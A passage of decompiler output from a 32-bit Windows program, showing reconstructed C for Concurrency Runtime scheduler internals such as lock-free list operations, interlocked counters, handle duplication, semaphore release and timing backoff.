    result = _InterlockedCompareExchange(this, (signed __int32)a2, v2);
  }
  while ( result != v2 );
  return result;
}

//----- (004766C6) --------------------------------------------------------
char __thiscall sub_4766C6(unsigned int *this, struct _SINGLE_LIST_ENTRY *a2, int a3, int a4, int a5, int a6)
{
  char v6; // bl
  int v8[4]; // [esp-14h] [ebp-30h] BYREF
  int v9; // [esp-4h] [ebp-20h]
  __int32 v10[3]; // [esp+Ch] [ebp-10h] BYREF
  unsigned int *v11; // [esp+18h] [ebp-4h]

  v11 = this;
  v6 = 0;
  if ( sub_46F930(dword_4F0C08) != (LPVOID)(a2 != 0 ? (unsigned int)&a2[1] : 0) )
  {
    sub_478772();
    v9 = 5;
    v10[0] = 0;
    sub_4777A9(v8, &a3);
    if ( sub_4752E9(v11, v10, v8[0], v8[1], v8[2], v8[3], v9) )
    {
      sub_47C5DF((int)v10, a2);
      v6 = 1;
    }
    sub_478772();
  }
  return v6;
}
// 478772: using guessed type int sub_478772(void);
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00476733) --------------------------------------------------------
int __thiscall sub_476733(void **this, void *a2)
{
  int result; // eax

  j_j_j___free_base(this[1]);
  *this = a2;
  result = unknown_libname_28((unsigned __int64)(((unsigned int)a2 + 31) >> 5) >> 30 != 0 ? -1 : 4
                                                                                               * (((unsigned int)a2 + 31) >> 5));
  this[1] = (void *)result;
  return result;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (0047676A) --------------------------------------------------------
signed __int32 __thiscall sub_47676A(int this)
{
  signed __int32 result; // eax

  result = 0;
  if ( (*(_BYTE *)(this + 48) & 4) == 0 )
    return _InterlockedIncrement((volatile signed __int32 *)(this + 20));
  return result;
}

//----- (0047677A) --------------------------------------------------------
signed __int32 __thiscall sub_47677A(volatile signed __int32 *this)
{
  signed __int32 v2; // edi
  volatile __int32 *v3; // ecx
  _BYTE *v4; // eax
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  v2 = _InterlockedIncrement(this + 96);
  if ( v2 == 1 )
  {
    v3 = this + 99;
    if ( *((int *)this + 99) <= 0 )
    {
      _InterlockedExchange(v3, 1);
    }
    else
    {
      v4 = sub_46F930(dword_4F0C08);
      if ( !v4 || v4[76] || (volatile signed __int32 *)sub_406D70(v4) != this )
      {
        std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_reference_Concurrency__);
      }
      sub_476E48(this);
    }
  }
  return v2;
}
// 47782C: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4F0C08: using guessed type int dword_4F0C08;

//----- (004767EA) --------------------------------------------------------
int __thiscall sub_4767EA(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 97);
  return (*(int (__thiscall **)(volatile signed __int32 *))(*this + 16))(this);
}

//----- (00476809) --------------------------------------------------------
void __thiscall sub_476809(volatile signed __int32 *this, HANDLE hSourceHandle)
{
  HANDLE v3; // eax
  _DWORD *v4; // eax
  int LastError; // eax
  HANDLE CurrentProcess; // [esp-14h] [ebp-2Ch]
  int v7; // [esp+4h] [ebp-14h] BYREF
  char pExceptionObject[12]; // [esp+8h] [ebp-10h] BYREF
  HANDLE TargetHandle; // [esp+14h] [ebp-4h] BYREF

  if ( !hSourceHandle || hSourceHandle == (HANDLE)-1 )
  {
    sub_46A08B(pExceptionObject, (int)"eventObject");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  TargetHandle = 0;
  CurrentProcess = GetCurrentProcess();
  v3 = GetCurrentProcess();
  if ( !DuplicateHandle(v3, hSourceHandle, CurrentProcess, &TargetHandle, 0, 0, 2u) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(&v7, LastError);
    _CxxThrowException(&v7, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  v4 = operator new(0xCu);
  v4[2] = TargetHandle;
  sub_474832(this + 46, v4);
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004768AB) --------------------------------------------------------
signed __int32 __thiscall sub_4768AB(volatile signed __int32 *this)
{
  signed __int32 v1; // esi

  v1 = _InterlockedDecrement(this + 96);
  if ( !v1 )
    sub_47657D((int)this);
  return v1;
}

//----- (004768C3) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_4768C3(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  union _SLIST_HEADER *v2; // edi

  v2 = (union _SLIST_HEADER *)(this + 496);
  if ( QueryDepthSList((PSLIST_HEADER)(this + 496)) >= *(int *)(this + 20) )
    return (PSLIST_ENTRY)sub_473BFE((int)a2);
  sub_480859((int)a2);
  return InterlockedPushEntrySList(v2, a2 + 1);
}

//----- (00476905) --------------------------------------------------------
int __thiscall sub_476905(volatile signed __int32 *this)
{
  _InterlockedDecrement(this + 97);
  return (*(int (__thiscall **)(volatile signed __int32 *))(*this + 20))(this);
}

//----- (00476924) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_476924(int this, struct _SINGLE_LIST_ENTRY *a2, char a3)
{
  if ( a3 )
    (*(void (__thiscall **)(_DWORD, struct _SINGLE_LIST_ENTRY *))(**(_DWORD **)(this + 428) + 12))(
      *(_DWORD *)(this + 428),
      a2);
  _InterlockedDecrement((volatile signed __int32 *)(this + 400));
  return InterlockedPushEntrySList((PSLIST_HEADER)(this + 488), a2 + 2);
}

//----- (0047696E) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_47696E(int this, int a2)
{
  union _SLIST_HEADER *v3; // edi
  int DepthSList; // edx
  PSLIST_ENTRY result; // eax

  v3 = (union _SLIST_HEADER *)(this + 504);
  DepthSList = QueryDepthSList((PSLIST_HEADER)(this + 504));
  result = (PSLIST_ENTRY)(32 * *(_DWORD *)(this + 20));
  if ( DepthSList < (int)result )
    return InterlockedPushEntrySList(v3, (PSLIST_ENTRY)(a2 + 12));
  if ( a2 )
    return (PSLIST_ENTRY)(**(int (__thiscall ***)(int, int))a2)(a2, 1);
  return result;
}

//----- (004769BE) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_4769BE(union _SLIST_HEADER *this)
{
  union _SLIST_HEADER *v1; // esi
  PSLIST_ENTRY result; // eax
  struct _SINGLE_LIST_ENTRY *i; // ebx
  PSLIST_ENTRY v4; // ebx

  v1 = this;
  result = InterlockedPopEntrySList(this + 64);
  for ( i = result != 0 ? &result[-2] : 0; i; i = v4 != 0 ? &v4[-2] : 0 )
  {
    (*(void (__thiscall **)(_DWORD, struct _SINGLE_LIST_ENTRY *))(**(_DWORD **)&v1[53].Depth + 12))(
      *(_DWORD *)&v1[53].Depth,
      i);
    v1 = this;
    sub_476924((int)this, i, 0);
    v4 = InterlockedPopEntrySList(this + 64);
    result = v4 - 2;
  }
  return result;
}

//----- (00476A28) --------------------------------------------------------
BOOL __thiscall sub_476A28(HANDLE *this, LONG lReleaseCount)
{
  BOOL result; // eax

  if ( lReleaseCount > 0 )
    return ReleaseSemaphore(this[95], lReleaseCount, 0);
  return result;
}

//----- (00476A46) --------------------------------------------------------
int __thiscall sub_476A46(int *this, int a2)
{
  int result; // eax

  *(_DWORD *)(*(_DWORD *)(a2 + 4) + 8) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4) = *(_DWORD *)(a2 + 4);
  result = *this;
  if ( a2 == *this )
  {
    if ( result == *(_DWORD *)(result + 4) )
      result = 0;
    else
      result = *(_DWORD *)(result + 8);
    *this = result;
  }
  return result;
}

//----- (00476A78) --------------------------------------------------------
char __thiscall sub_476A78(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4)
{
  int v5; // eax
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // edi
  int v9; // eax
  int v10; // edi
  int v11; // eax
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6), 0, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = (struct _SINGLE_LIST_ENTRY *)(a2 + 4);
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && (*(_DWORD *)(*(_DWORD *)&ListHead[4].Depth + 404) & 0xA0000000) != -1610612736
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_4761CF(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_474B72,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (00476B71) --------------------------------------------------------
char __thiscall sub_476B71(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4)
{
  int v5; // eax
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // edi
  int v9; // eax
  int v10; // edi
  int v11; // eax
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6), 0, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = (struct _SINGLE_LIST_ENTRY *)(a2 + 52);
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && (*(_DWORD *)(*(_DWORD *)&ListHead[4].Depth + 404) & 0xA0000000) != -1610612736
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_4761CF(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_474B7E,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (00476C6A) --------------------------------------------------------
int __thiscall sub_476C6A(int *this)
{
  int result; // eax
  int v2; // esi

  result = *this;
  if ( *this )
  {
    v2 = *(_DWORD *)(result + 4);
    if ( result == v2 )
    {
      *this = 0;
    }
    else
    {
      *(_DWORD *)(*(_DWORD *)(v2 + 4) + 8) = result;
      *(_DWORD *)(*this + 4) = *(_DWORD *)(v2 + 4);
    }
    return v2;
  }
  return result;
}

//----- (00476C92) --------------------------------------------------------
_DWORD *__thiscall sub_476C92(_DWORD *this)
{
  _DWORD *result; // eax
  _DWORD *v2; // esi

  result = (_DWORD *)*this;
  if ( *this )
  {
    v2 = (_DWORD *)*result;
    if ( result == (_DWORD *)*result )
    {
      *this = 0;
    }
    else
    {
      *(_DWORD *)(*v2 + 4) = result;
      *(_DWORD *)*this = *v2;
    }
    return v2;
  }
  return result;
}

//----- (00476CB6) --------------------------------------------------------
_DWORD *__thiscall sub_476CB6(int this)
{
  volatile signed __int32 *v2; // esi
  _DWORD *v3; // edi

  v2 = (volatile signed __int32 *)(this + 4);
  sub_46F085((volatile signed __int32 *)(this + 4));
  v3 = sub_476C92((_DWORD *)this);
  sub_46F19F(v2);
  return v3;
}

//----- (00476CEA) --------------------------------------------------------
void __thiscall sub_476CEA(int this, int a2)
{
  volatile signed __int32 *v3; // edi

  v3 = (volatile signed __int32 *)(this + 308);
  sub_46F085((volatile signed __int32 *)(this + 308));
  if ( *(_DWORD *)(a2 + 12) == 2 )
    sub_476A46((int *)(this + 304), a2);
  *(_DWORD *)(a2 + 12) = 0;
  sub_46F19F(v3);
}

//----- (00476D26) --------------------------------------------------------
char __thiscall sub_476D26(union _SLIST_HEADER *this, signed __int32 a2)
{
  return sub_476B71(this + 12, a2, *(_DWORD *)(a2 + 24), 1);
}

//----- (00476D3E) --------------------------------------------------------
char __thiscall sub_476D3E(_DWORD *this)
{
  char result; // al

  result = sub_47FE68(this);
  this[14] = 0;
  return result;
}

//----- (00476D4C) --------------------------------------------------------
int __thiscall sub_476D4C(_DWORD *this, int a2, unsigned int a3)
{
  int result; // eax
  unsigned int v4; // ebx
  unsigned int v5; // edi
  int v6; // eax
  int v7; // eax
  int (__thiscall ***v8)(_DWORD); // ebx
  int v9; // edi
  int v10; // eax
  int v11; // [esp-Ch] [ebp-28h]
  char v12[4]; // [esp+0h] [ebp-1Ch] BYREF
  char pExceptionObject[4]; // [esp+4h] [ebp-18h] BYREF
  int v14; // [esp+8h] [ebp-14h]
  int (*v15)(); // [esp+Ch] [ebp-10h]
  unsigned int v16; // [esp+10h] [ebp-Ch]
  _DWORD *v17; // [esp+14h] [ebp-8h]
  int (__thiscall ***v18)(_DWORD); // [esp+18h] [ebp-4h]

  result = a2;
  v17 = this;
  if ( !a2 )
  {
    sub_46A08B(pExceptionObject, v11);
LABEL_18:
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = a3;
  if ( !a3 )
  {
    sub_46A08B(pExceptionObject, (int)"count");
    goto LABEL_18;
  }
  v5 = 0;
  v16 = 0;
  do
  {
    v18 = *(int (__thiscall ****)(_DWORD))(result + 4 * v5);
    v6 = (**v18)(v18);
    v7 = sub_47D269(*(_DWORD **)(v17[8] + 4 * v6), (int)v18);
    if ( !v7 )
    {
      v8 = v18;
      v9 = (int)v17;
      do
      {
        v14 = 0;
        v15 = sub_46FD09;
        while ( sub_46E3D5((int)v12) )
          ;
        SwitchToThread();
        v10 = (**v8)(v8);
        v7 = sub_47D269(*(_DWORD **)(*(_DWORD *)(v9 + 32) + 4 * v10), (int)v8);
      }
      while ( !v7 );
      v5 = v16;
      v4 = a3;
    }
    if ( *(_BYTE *)(v7 + 172) )
      v7 = sub_47DEF4(*(volatile signed __int32 **)(v7 + 176), v7);
    if ( v7 )
      sub_47C8B0((_BYTE *)v7);
    result = a2;
    v16 = ++v5;
  }
  while ( v5 < v4 );
  return result;
}
// 476E34: variable 'v11' is possibly undefined
// 476D4C: using guessed type char var_1C[4];
// 476D4C: using guessed type char pExceptionObject[4];

//----- (00476E48) --------------------------------------------------------
signed __int32 __thiscall sub_476E48(volatile signed __int32 *this)
{
  volatile signed __int32 *v2; // ebx
  int v3; // esi
  signed __int32 result; // eax
  signed __int32 v5; // edx

  v2 = this + 101;
  v3 = sub_476FF2((int *)this + 101, 0x80000000);
  result = _InterlockedCompareExchange(v2, v3 & 0x7FFFFFFF, v3);
  if ( result != v3 )
  {
    do
    {
      v5 = result;
      result = _InterlockedCompareExchange(v2, result & 0x7FFFFFFF, result);
    }
    while ( result != v5 );
  }
  _InterlockedIncrement(this + 98);
  return result;
}

//----- (00476E8F) --------------------------------------------------------
PSLIST_ENTRY __cdecl sub_476E8F(PSLIST_ENTRY ListEntry)
{
  if ( LOBYTE(ListEntry[193].Next) )
    _InterlockedDecrement(&dword_4F0C14);
  if ( QueryDepthSList(&ListHead) >= 0x10u )
    return (PSLIST_ENTRY)sub_4745BB((int)ListEntry, 1);
  else
    return InterlockedPushEntrySList(&ListHead, ListEntry);
}
// 4F0C14: using guessed type int dword_4F0C14;

//----- (00476ED0) --------------------------------------------------------
LPVOID sub_476ED0()
{
  if ( dword_4E81A4 >= 0 )
    return 0;
  else
    return sub_46F930(dword_4F0C08);
}
// 4E81A4: using guessed type int dword_4E81A4;
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00476EEC) --------------------------------------------------------
char __thiscall sub_476EEC(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // esi
  signed __int32 v2; // edx

  v1 = this + 96;
  while ( *v1 )
  {
    v2 = *v1;
    if ( _InterlockedCompareExchange(v1, v2 + 1, v2) == v2 )
      return 1;
  }
  return 0;
}

//----- (00476F0E) --------------------------------------------------------
int __thiscall sub_476F0E(_DWORD *this, int a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  int (__thiscall ***v6)(_DWORD, int, int); // edi

  v4 = sub_46F930(dword_4F0C08);
  v5 = v4;
  if ( v4 && (_DWORD *)sub_406D70(v4) == this )
    v6 = (int (__thiscall ***)(_DWORD, int, int))sub_4782B7(v5);
  else
    v6 = (int (__thiscall ***)(_DWORD, int, int))this[44];
  return (**v6)(v6, a2, a3);
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00476F5F) --------------------------------------------------------
int __thiscall sub_476F5F(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4)
{
  _DWORD *v5; // eax
  _DWORD *v6; // esi
  void *v7; // eax

  v5 = sub_46F930(dword_4F0C08);
  v6 = v5;
  if ( v5 && (_DWORD *)sub_406D70(v5) == this )
    v7 = (void *)sub_4782B7(v6);
  else
    v7 = (void *)this[44];
  return sub_47FF10(v7, a2, a3, a4);
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00476F9C) --------------------------------------------------------
void __thiscall sub_476F9C(_DWORD *this, int a2)
{
  if ( this[3] == 1 )
    this[94] = sub_4758A5(this, *(_DWORD *)(a2 + 184));
}

//----- (00476FC1) --------------------------------------------------------
int __cdecl sub_476FC1(int *a1, int a2)
{
  int result; // eax
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  result = *a1;
  if ( (*a1 & a2) != 0 )
  {
    v4 = 0;
    v5 = sub_46FCCB;
    do
    {
      sub_46E3D5((int)v3);
      result = *a1;
    }
    while ( (*a1 & a2) != 0 );
  }
  return result;
}
// 476FC1: using guessed type char var_10[8];

//----- (00476FF2) --------------------------------------------------------
int __cdecl sub_476FF2(int *a1, int a2)
{
  int v2; // edx
  char v4[8]; // [esp+4h] [ebp-10h] BYREF
  int v5; // [esp+Ch] [ebp-8h]
  void (*v6)(); // [esp+10h] [ebp-4h]

  v2 = *a1;
  if ( (a2 & *a1) != a2 )
  {
    v5 = 0;
    v6 = sub_46FCCB;
    do
    {
      sub_46E3D5((int)v4);
      v2 = *a1;
    }
    while ( (a2 & *a1) != a2 );
  }
  return v2;
}
// 476FF2: using guessed type char var_10[8];

//----- (0047702C) --------------------------------------------------------
char __thiscall sub_47702C(unsigned int *this, int a2, int a3, int a4, int a5, int a6)
{
  int v8[4]; // [esp-14h] [ebp-1Ch] BYREF
  int v9; // [esp-4h] [ebp-Ch]

  v9 = 3;
  sub_4777A9(v8, &a3);
  return sub_477052(this, a2, v8[0], v8[1], v8[2], v8[3], v9);
}

//----- (00477052) --------------------------------------------------------
char __thiscall sub_477052(unsigned int *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  char v8; // bl
  int v10[4]; // [esp-14h] [ebp-28h] BYREF
  int v11; // [esp-4h] [ebp-18h]
  __int32 v12[3]; // [esp+8h] [ebp-Ch] BYREF

  v8 = 0;
  sub_478772();
  v11 = a7;
  v12[0] = 0;
  sub_4777A9(v10, &a3);
  if ( sub_4752E9(this, v12, v10[0], v10[1], v10[2], v10[3], v11) )
  {
    sub_47C54E((_DWORD **)v12[1], v12[0], a2, 0);
    v12[0] = 0;
    v8 = 1;
  }
  sub_478772();
  return v8;
}
// 478772: using guessed type int sub_478772(void);

//----- (004770A7) --------------------------------------------------------
int sub_4770A7()
{
  int result; // eax

  result = sub_46FC8F(&dword_4F0C1C);
  if ( !--dword_4F0C10 )
  {
    sub_47C19F();
    while ( 1 )
    {
      result = (int)InterlockedPopEntrySList(&ListHead);
      if ( !result )
        break;
      sub_4745BB(result, 1);
    }
  }
  dword_4F0C1C = 0;
  return result;
}
// 4F0C10: using guessed type int dword_4F0C10;
// 4F0C1C: using guessed type int dword_4F0C1C;

//----- (004770FD) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_4770FD(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4)
{
  union _SLIST_HEADER *v4; // esi
  int v5; // edi
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int v7; // esi
  struct _SINGLE_LIST_ENTRY *v8; // eax
  _DWORD *v9; // eax
  int v10; // edx
  int v11; // eax
  int v12; // ecx
  int v13; // ebx
  int v14; // edx
  int v15; // ecx
  union _SLIST_HEADER *result; // eax
  int *v17; // eax
  int *v18; // edi
  int v19; // edx
  int v20; // eax
  int v21; // ecx
  _DWORD *v23; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  v4 = this;
  v5 = 0;
  for ( i = 0; v5 < *(_DWORD *)&v4[5].Depth; i = v5 )
  {
    Next = v4[4].Next.Next[v5].Next;
    if ( Next && (int)Next[30].Next > 0 )
    {
      v7 = 0;
      v8 = Next + 14;
      do
      {
        v9 = (_DWORD *)sub_4743F9(v8, v7);
        v23 = v9;
        if ( v9 )
        {
          v10 = v9[26] - v9[28];
          v9[28] = v9[26];
          v11 = v9[27];
          v12 = v11 - v23[29];
          v23[29] = v11;
          *a3 += v10;
          *a2 += v12;
          a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v10 - v12);
        }
        ++v7;
        v8 = Next + 14;
      }
      while ( v7 < (int)Next[30].Next );
      v4 = this;
      v5 = i;
    }
    ++v5;
  }
  v13 = 0;
  v14 = *(_DWORD *)&v4[55].Depth - *(_DWORD *)&v4[56].Depth;
  *(_DWORD *)&v4[56].Depth = *(_DWORD *)&v4[55].Depth;
  v15 = (char *)v4[56].Next.Next - (char *)v4[57].Next.Next;
  v4[57].Next.Next = v4[56].Next.Next;
  *a3 += v14;
  *a2 += v15;
  result = a4;
  a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v14 - v15);
  if ( (int)v4[33].Next.Next > 0 )
  {
    result = v4 + 25;
    do
    {
      v17 = (int *)sub_4743F9(result, v13);
      v18 = v17;
      if ( v17 )
      {
        v19 = v17[2] - v17[4];
        v20 = v17[3];
        v18[4] = v18[2];
        v21 = v20 - v18[5];
        v18[5] = v20;
        *a3 += v19;
        *a2 += v21;
        a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v19 - v21);
        if ( !sub_47624F(v18) )
        {
          sub_476A78(v4 + 25, (signed __int32)v18, *v18, 0);
          sub_46C87D(v18);
        }
      }
      ++v13;
      result = v4 + 25;
    }
    while ( v13 < (int)v4[33].Next.Next );
  }
  return result;
}

//----- (00477239) --------------------------------------------------------
int __thiscall sub_477239(volatile signed __int32 *this)
{
  _BYTE *v2; // eax
  int v3; // eax
  int result; // eax
  signed __int32 v5; // eax
  signed __int32 v6; // edx
  char v7; // [esp+Bh] [ebp-1h]

  v2 = sub_46F930(dword_4F0C08);
  v7 = 1;
  if ( v2 && !v2[76] )
  {
    v7 = 0;
    UserMathErrorFunction();
  }
  v3 = (*(int (__thiscall **)(volatile signed __int32 *))(*this + 72))(this);
  if ( v3 )
  {
    if ( v3 == 2 && !*((_DWORD *)this + 102) )
      _InterlockedExchange(this + 102, 1);
    v5 = *((_DWORD *)this + 101);
    do
    {
      v6 = v5;
      v5 = _InterlockedCompareExchange(this + 101, v5 & 0xBFFFFFFF, v5);
    }
    while ( v5 != v6 );
    result = sub_476A28((HANDLE *)this, v5 & 0x1FFFFFFF);
  }
  else
  {
    result = sub_4765F3((int)this);
  }
  if ( !v7 )
    return UserMathErrorFunction();
  return result;
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (004772D5) --------------------------------------------------------
char __thiscall sub_4772D5(_DWORD *this)
{
  char result; // al
  volatile signed __int32 *v3; // ebx
  struct _SINGLE_LIST_ENTRY *i; // eax
  char v5; // dl
  char v6; // al
  volatile signed __int32 v7; // ecx
  int v8; // esi
  unsigned int v9; // esi
  int TickCount64; // eax
  ULONG v11; // eax
  int v12[4]; // [esp-14h] [ebp-3Ch] BYREF
  int v13; // [esp-4h] [ebp-2Ch]
  int v14[6]; // [esp+Ch] [ebp-1Ch] BYREF
  char v15; // [esp+26h] [ebp-2h]
  char v16; // [esp+27h] [ebp-1h]

  result = 0;
  v3 = this + 121;
  if ( (int)this[121] <= 0 )
    return result;
  v16 = 0;
  v15 = 0;
  for ( i = (struct _SINGLE_LIST_ENTRY *)sub_47569E((int)this, 0);
        ;
        i = (struct _SINGLE_LIST_ENTRY *)sub_47569E((int)this, 0) )
  {
    if ( !i )
    {
      v5 = v16;
      v6 = 1;
      v15 = 1;
      goto LABEL_10;
    }
    v5 = sub_4762FC((int)this, i) | v16;
    v16 = v5;
    if ( (int)this[110] <= 0 )
      break;
    if ( sub_477442(this, 1) )
    {
      v5 = v16;
      break;
    }
  }
  v6 = v15;
LABEL_10:
  if ( !this[102] && (v6 || (int)this[110] > 0) )
    goto LABEL_17;
  v7 = *v3;
  result = _InterlockedExchangeAdd(v3, -*v3) != v7;
  if ( !result )
  {
    if ( !this[102] )
      return result;
    if ( v5 )
      return result;
    memset(v14, 0, 16);
    v13 = 11;
    v8 = *(_DWORD *)(sub_475884(this) + 8);
    sub_4777A9(v12, v14);
    result = sub_477052(this, v8, v12[0], v12[1], v12[2], v12[3], v13);
    if ( result )
      return result;
LABEL_17:
    _InterlockedExchange(v3, 1);
  }
  v9 = sub_477442(this, 1);
  TickCount64 = j____crtGetTickCount64();
  v11 = TickCount64 - this[116] < v9 ? v9 - (TickCount64 - this[116]) : 0;
  if ( v15 )
  {
    if ( v11 < 0x1F4 )
      v11 = 500;
  }
  return sub_474ABC(this, v11);
}
// 46F7CA: using guessed type int j____crtGetTickCount64(void);

//----- (004773E9) --------------------------------------------------------
char __stdcall sub_4773E9(int a1, _DWORD *a2, int a3)
{
  return sub_4772D5(a2);
}

//----- (004773F8) --------------------------------------------------------
char __stdcall sub_4773F8(_DWORD *a1, int a2)
{
  return sub_4772D5(a1);
}

//----- (00477407) --------------------------------------------------------
void __stdcall Callback(_DWORD *a1, BOOLEAN a2)
{
  unsigned int v2; // esi
  unsigned int v3; // eax

  v2 = sub_477442(a1, 1);
  v3 = j____crtGetTickCount64() - a1[116];
  if ( v3 >= v2 )
    sub_4772D5(a1);
  else
    sub_474ABC(a1, v2 - v3);
}
// 46F7CA: using guessed type int j____crtGetTickCount64(void);

//----- (00477442) --------------------------------------------------------
int __thiscall sub_477442(_DWORD *this, int a2)
{
  unsigned int v2; // eax
  unsigned int v3; // ecx
  unsigned int v5; // eax
  int v6; // eax

  v2 = this[100];
  v3 = this[115];
  if ( v2 < v3 )
    return 0;
  v5 = v2 - v3;
  if ( v5 >= 0x64 )
  {
    if ( v5 >= 0x12C )
    {
      if ( v5 >= 0x258 )
      {
        if ( v5 >= 0x5DC )
        {
          if ( v5 >= 0x9C4 )
          {
            if ( v5 >= 0xFA0 )
              v6 = (v5 >> 1) + 8200;
            else
              v6 = v5 / 3 + 2500;
          }
          else
          {
            v6 = v5 / 3 + 555;
          }
        }
        else
        {
          v6 = (v5 >> 2) + 180;
        }
      }
      else
      {
        v6 = v5 / 5 + 60;
      }
    }
    else
    {
      v6 = (v5 >> 3) + 15;
    }
  }
  else
  {
    v6 = v5 / 0xA + 5;
  }
  return a2 * v6;
}

//----- (004774D9) --------------------------------------------------------
int __cdecl sub_4774D9(char a1, char a2, int a3)
{
  int result; // eax
  _DWORD v4[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_4F0C68 )
  {
    memset((char *)v4 + 2, 0, 0x3Eu);
    v4[11] = 0x20000;
    LOWORD(v4[0]) = 64;
